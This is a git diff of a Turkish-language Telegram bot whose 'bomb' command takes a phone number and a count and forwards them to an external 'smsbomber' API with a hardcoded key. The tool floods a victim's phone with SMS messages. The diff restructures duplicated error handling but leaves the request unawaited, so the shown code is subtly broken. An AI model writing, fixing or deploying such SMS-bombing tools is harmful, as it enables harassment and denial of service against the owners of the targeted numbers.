@@ -64,7 +64,7 @@ bot.action('ping', (ctx) => {
 });
 
 
-bot.command("bomb", (ctx, match) => {
+bot.command("bomb", async (ctx, match) => {
   try {
     const bannedIds = fs.readFileSync('banneds.txt', 'utf-8').split('\n');
     const userId = ctx.message.from.id;
@@ -76,19 +76,7 @@ bot.command("bomb", (ctx, match) => {
 
     const numara = match[1];
     const miktar = match[2];
-    
-    const response = await axios.get(`http://oslocheck.com.tr/api/smsbomber?key=ggsahip&numara=${numara}&miktar=${miktar}`);
-    const responseData = response.data;
 
-    console.log('Alınan metin:', responseData);
-    ctx.replyWithHTML(`<b>Sonuç:</b> <code>${responseData}</code>`);
-  } catch (error) {
-    try {
-      ctx.replyWithHTML(`<b>HATA:</b>\n\n<code>${error}</code>`);
-    } catch (error) {
-      console.log(error);
-    }
-  }
     const response = axios.get(`http://oslocheck.com.tr/api/smsbomber?key=ggsahip&numara=${numara}&miktar=${miktar}`);
     const responseData = response.data;
 
@@ -99,13 +87,6 @@ bot.command("bomb", (ctx, match) => {
       ctx.replyWithHTML(`<b>HATA:</b>\n\n<code>${error}</code>`);
     } catch (error) {
       console.log(error);
-    }
-  }
-  } catch (error) {
-    try {
-      ctx.replyWithHTML(`<b>HATA:</b>\n\n<code> ${error} </code>`);
-    } catch (error) {
-      console.log(error)
     }
   }
 });
